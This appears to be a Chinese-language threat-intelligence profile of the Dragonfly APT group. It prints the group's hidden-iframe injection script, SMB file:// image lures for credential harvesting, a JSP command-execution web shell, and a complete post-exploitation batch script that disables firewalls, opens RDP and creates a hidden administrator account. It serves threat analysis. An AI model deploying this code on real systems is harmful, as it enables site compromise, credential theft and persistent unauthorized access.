# Dragonfly

## 特征

1. 通过注入HTML代码使其网站重定向到托管的Lightsout网站.

```html
<script type="text/javascript">
var WWCPou=document.createElement("iframe");
WWCPou.height=1;
WWCPou.width=1;
WWCPou.style.visibility="hidden" ;
WWCPou.src="http://域名/wp-includes/pomo/dtsrc.php";
document.getElementsByTagName("head")[0].appendChild(WWCPou);
</script>
```

2. 使用水坑攻击，并修改被控制网站的网页代码以使用SMB从被控主机请求文件图标，其中修改了header.php文件来加载图片.

```html
<img src="file://IP地址/main_logo.png" style="height: 1px; width: 1px;" />
```

还会修改modernizr.js文件来加载图片，该JavaScript文件用来检测浏览器各个方面的合法JavaScript库.

```JavaScript
var i = document.createElement("img");
i.src = "file://IP地址/ame_icon.png";
i.width = 3;
i.height= 2;
```

3. 在后渗透阶段会使用脚本创建一个伪装成合法备份帐户的本地管理员帐户，脚本名为symantec_help.jsp，存储在C:\Program Files (x86)\Symantec\Symantec Endpoint Protection Manager\tomcat\webapps\ROOT\目录下.

```jsp
<% Runtime.getRuntime().exec("cmd /C \"" + System.getProperty("user.dir") + "\\..\\webapps\\ROOT\\<enu.cmd>\""); %>
```

enu.cmd脚本用于创建管理员账户、禁用主机防火墙和为RDP开启端口并全局访问，然后尝试将新建的用户添加至管理员组以获取权限.

```bash
netsh firewall set opmode disable  //关闭防火墙
netsh advfirewall set allprofiles state off  //关闭当前网络防火墙
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 3389:TCP /t REG_SZ /d "3389:TCP:*:Enabled:Remote Desktop" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile\GloballyOpenPorts\List" /v 3389:TCP /t REG_SZ /d "3389:TCP:*:Enabled:Remote Desktop" /f
//开启远程桌面3389端口
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
//开启终端服务
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f
//多用户同时登录
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f
//3389远程桌面多用户同时登录
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxInstanceCount /t REG_DWORD /d 100 /f
//限制同时登录最大实例
net user MS_BACKUP 密码 /add  //创建用户
net localgroup Administrators /add MS_BACKUP
net localgroup Administradores /add MS_BACKUP
net localgroup Amministratori /add MS_BACKUP
net localgroup Administratoren /add MS_BACKUP
net localgroup Administrateurs /add MS_BACKUP
net localgroup "Remote Desktop Users" /add MS_BACKUP
//添加用户到管理员组
net user MS_BACKUP /expires:never  //指定用户永不过期
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v MS_BACKUP /t REG_DWORD /d 0 /f
//将用户设置为隐藏用户
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f
//登录时不显示最后一个用户名
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
//禁用本地账户令牌过滤器
sc config termservice start = auto  //设置终端服务配置
net start termservice  //启用终端服务
```
